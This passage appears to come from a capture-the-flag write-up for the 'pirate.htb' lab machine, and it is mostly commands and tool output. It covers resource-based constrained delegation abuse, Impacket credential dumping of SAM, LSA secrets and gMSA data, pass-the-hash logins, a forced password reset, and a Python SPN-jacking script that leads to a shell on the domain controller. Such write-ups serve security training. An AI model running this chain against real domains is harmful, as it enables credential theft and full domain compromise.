We use `netcat` after `coercing the web server` to get `Impersonation` : 

```bash
>  nc 127.0.0.1 11000  
  
Type help for list of commands  
  
# set_rbcd WEB01$ MS01$  
  
Found Target DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb  
Target SID: S-1-5-21-4107424128-4158083573-1300325248-3102  
  
Found Grantee DN: CN=MS01,CN=Computers,DC=pirate,DC=htb  
Grantee SID: S-1-5-21-4107424128-4158083573-1300325248-4102  
Delegation rights modified successfully!  
MS01$ can now impersonate users on WEB01$ via S4U2Proxy  
```

Then, we use `Impacket` to `impersonate Administrator` :

```bash
>  sudo ntpdate 10.129.244.95  
PYTHONNOUSERSITE=1 getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip 192.168.100.1 'pirate.htb/MS01$:ms01'  
export KRB5CCNAME="${PWD}/Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache"  
PYTHONNOUSERSITE=1 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb  
Please touch the FIDO authenticator.  
15 Jun 21:58:58 ntpdate[1759090]: adjust time server 10.129.244.95 offset +0.002746 sec  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[-] CCache file is not found. Skipping...  
[*] Getting TGT for user  
[*] Impersonating Administrator  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Service RemoteRegistry is in stopped state  
[*] Starting service RemoteRegistry  
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::  
[*] Dumping cached domain logon information (domain/username:hash)  
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)  
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-06-15 06:00:28+00:00)  
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-06-15 05:58:25+00:00)  
[*] Dumping LSA Secrets  
[*] $MACHINE.ACC    
PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9  
034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0d  
baa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558  
PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::  
[*] DefaultPassword    
PIRATE\a.white:E2nvAOKSz5Xz2MJu  
[*] DPAPI_SYSTEM    
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989  
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9  
[*] NL$KM    
0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|  
0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.  
0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.<]...I  
0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...  
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a  
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11    
0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.  
0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..  
0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.  
0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&....As..  
0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm  
0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k  
0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..  
0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.  
0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...  
0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....  
00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..  
00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........  
00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..  
00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.  
00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g  
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412  
c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c54  
99455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067  
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11    
0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........  
0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.  
0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.  
0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;  
0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R>.'g...sJ....  
0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c  
0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.<  
0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q  
0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.  
0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...  
00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a  
00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..  
00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6  
00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&O.  
00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?."`..0X..]..u  
00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..  
0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...  
0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.  
0120   00 00                                              ..  
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c  
0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318b  
e131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89  
bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000  
[*] Cleaning up...    
[*] Stopping service RemoteRegistry
```

We verify `Administrator`'s `NT hash` and `a.white`'s credentials :

```bash
>  nxc winrm 192.168.100.2 -u Administrator -H b1aac1584c2ea8ed0a9429684e4fc3e5 --local-auth  
  
WINRM       192.168.100.2   5985   WEB01            [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb)    
WINRM       192.168.100.2   5985   WEB01            [+] WEB01\Administrator:b1aac1584c2ea8ed0a9429684e4fc3e5 (Pwn3d!)

>  nxc smb 192.168.100.1 -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb  
  
SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         192.168.100.1   445    DC01             [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu
```

We connect to the admin shell and :

```PowerShell
*Evil-WinRM* PS C:\Users> type C:\Users\a.white\Desktop\user.txt  
1d9556b*************d36519
```

We'll then force change password on `a.white_adm` and check on `nxc` :

```bash
>  net rpc password 'a.white_adm' 'PirateAdm2025!' -U 'pirate.htb/a.white%E2nvAOKSz5Xz2MJu' -S 192.168.100.1

>  nxc smb 192.168.100.1 -u 'a.white_adm' -p 'PirateAdm2025!' -d pirate.htb  
  
SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         192.168.100.1   445    DC01             [+] pirate.htb\a.white_adm:PirateAdm2025!
```

Then, we use `Impacket` to find `Delegation` rights :

```bash
>  sudo ntpdate 10.129.244.95  
PYTHONNOUSERSITE=1 findDelegation.py 'pirate.htb/a.white_adm:PirateAdm2025!' -dc-ip 192.168.100.1  
Please touch the FIDO authenticator.  
15 Jun 22:14:21 ntpdate[1767347]: adjust time server 10.129.244.95 offset +0.002005 sec  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists    
-----------  -----------  ----------------------------------  ---------------------  ----------  
DC01$        Computer     Unconstrained                       N/A                    Yes           
a.white_adm  Person       Constrained w/ Protocol Transition  http/WEB01.pirate.htb  Yes           
a.white_adm  Person       Constrained w/ Protocol Transition  HTTP/WEB01             Yes           
MS01$        Computer     Resource-Based Constrained          WEB01$                 No
```

Then we use `SPNJack` with `python` and `impersonate the DC Admin` for root :

```PowerShell
>  cat > /tmp/spnjack.py << 'EOF'  
import ldap3  
server = ldap3.Server('192.168.100.1', get_info=ldap3.ALL)  
conn = ldap3.Connection(server, user='pirate.htb\\a.white_adm', password='PirateAdm2025!', authentication=ldap3.NTLM, auto_bind=True)  
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',  
   {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})  
print('WEB01 delete:', conn.result)  
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',  
   {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})  
print('DC01 add:', conn.result)  
EOF  
python3 /tmp/spnjack.py  
WEB01 delete: {'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}  
DC01 add: {'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}  
>  sudo ntpdate 10.129.244.95  
PYTHONNOUSERSITE=1 getST.py -spn HTTP/WEB01.pirate.htb -impersonate Administrator -altservice CIFS/DC01.pirate.htb -dc-ip 192.168.100.1 'pirate.htb/a.white_adm:PirateAdm2025!'  
export KRB5CCNAME="${PWD}/Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache"  
PYTHONNOUSERSITE=1 secretsdump.py -k -no-pass -just-dc-user Administrator -dc-ip 192.168.100.1 DC01.pirate.  
15 Jun 22:23:02 ntpdate[1771181]: adjust time server 10.129.244.95 offset +0.003582 sec  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Getting TGT for user  
[*] Impersonating Administrator  
[*] Requesting S4U2self  
[*] Requesting S4U2Proxy  
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB  
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
[-] 'NoneType' object has no attribute 'getRemoteHost'  
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter  
[*] Cleaning up...    
>  PYTHONNOUSERSITE=1 wmiexec.py -k -no-pass -dc-ip 192.168.100.1 -target-ip 192.168.100.1 DC01.pirate.htb  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] SMBv3.0 dialect used  
[!] Launching semi-interactive shell - Careful what you execute  
[!] Press help for extra shell commands  
C:\>type C:\Users\Administrator\Desktop\root.txt  
3a870b75c9************46b6b19b
```
